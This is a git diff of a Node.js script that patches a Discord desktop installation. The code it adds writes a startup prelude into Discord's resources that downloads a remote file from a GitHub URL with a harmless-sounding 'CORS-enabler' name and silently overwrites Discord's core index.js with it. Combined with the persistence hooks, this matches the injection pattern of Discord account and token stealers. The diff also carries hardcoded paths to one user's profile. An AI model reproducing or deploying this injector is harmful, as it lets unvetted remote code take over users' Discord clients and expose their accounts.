@@ -5,75 +5,58 @@ const path = require('path');
 
 const discordPath = (function () {
     const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
-    let resourcePath;
-
-    if (process.platform === 'win32') {
-        resourcePath = path.join(app, 'resources');
-    } else if (process.platform === 'darwin') {
-        resourcePath = path.join(app, 'Contents', 'Resources');
-    }
-
-    if (fs.existsSync(resourcePath)) return {
-        resourcePath,
-        app
-    };
-    return {
-        undefined,
-        undefined
-    };
+    const resourcePath = path.join(app, 'resources');
+    if (fs.existsSync(resourcePath)) return { app, resourcePath };
+    return { app: undefined, resourcePath: undefined };
 })();
 
-async function updateCheck() {
-    const { resourcePath, app } = discordPath;
-    if (resourcePath === undefined || app === undefined) return;
+function updateCheck() {
+    const { app, resourcePath } = discordPath;
+    if (!app || !resourcePath) return;
 
     const appPath = path.join(resourcePath, 'app');
-    const packageJson = path.join(appPath, 'package.json');
-    const resourceIndex = path.join(appPath, 'index.js');
+    const appAsarPath = path.join(resourcePath, 'app.asar');
 
-    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0];
-    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
+    const coreDir = fs.readdirSync(path.join(app, 'modules')).find(x => /discord_desktop_core-/.test(x));
+    const indexJsPath = path.join(app, 'modules', coreDir, 'discord_desktop_core', 'index.js');
+    const bdPath = 'C:\\Users\\fabri\\AppData\\Roaming\\betterdiscord\\data\\betterdiscord.asar';
 
-    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
+    const prelude = `const fs = require('fs'), https = require('https');
+const indexJs = '${indexJsPath.replace(/\\/g, '\\\\')}';
+const bdPath = '${bdPath.replace(/\\/g, '\\\\')}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('https://raw.githubusercontent.com/Entity378/CORS-enabler-for-Discord/refs/heads/main/index.js', (res) => {
+        const file = fs.createWriteStream(indexJs);
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
+    });
+}`;
+
+    const requireAppAsar = `require('${path.join(resourcePath, 'app.asar').replace(/\\/g, '\\\\')}');`;
+    const requireVencord = `require("C:\\\\Users\\\\fabri\\\\AppData\\\\Roaming\\\\Vencord\\\\dist\\\\patcher.js");`;
+    const requireBd = `if (fs.existsSync(bdPath)) require(bdPath);`;
+
+    const appIndexContent = `${prelude}\n${requireAppAsar}\n${requireBd}`;
+    const appAsarIndexContent = `${prelude}\n${requireVencord}\n${requireBd}`;
 
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
-    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
-    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
+    if (!fs.existsSync(appAsarPath)) fs.mkdirSync(appAsarPath);
 
-    if (process.platform === 'win32' || process.platform === 'darwin') {
-        fs.writeFileSync(
-            packageJson,
-            JSON.stringify({
-                name: 'discord',
-                main: 'index.js',
-            }, null, 4),
-        );
+    fs.writeFileSync(path.join(appPath, 'index.js'), appIndexContent);
+    fs.writeFileSync(path.join(appAsarPath, 'index.js'), appAsarIndexContent);
 
-        const startUpScript = `const fs = require('fs'), https = require('https');
-  const indexJs = '${indexJs}';
-  const bdPath = '${bdPath}';
-  const fileSize = fs.statSync(indexJs).size
-  fs.readFileSync(indexJs, 'utf8', (err, data) => {
-      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-          init();
-  })
-  async function init() {
-      https.get('https://raw.githubusercontent.com/Entity378/CORS-enabler-for-Discord/refs/heads/main/index.js', (res) => {
-          const file = fs.createWriteStream(indexJs);
-          res.pipe(file);
-          file.on('finish', () => {
-              file.close();
-          });
-      
-      }).on("error", (err) => {
-          setTimeout(init(), 10000);
-      });
-  }
-  require('${path.join(resourcePath, 'app.asar')}')
-  if (fs.existsSync(bdPath)) require(bdPath);`;
-
-        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
-    }
+    const pkgJson = JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4);
+    fs.writeFileSync(path.join(appPath, 'package.json'), pkgJson);
+    fs.writeFileSync(path.join(appAsarPath, 'package.json'), pkgJson);
 }
 
 //test
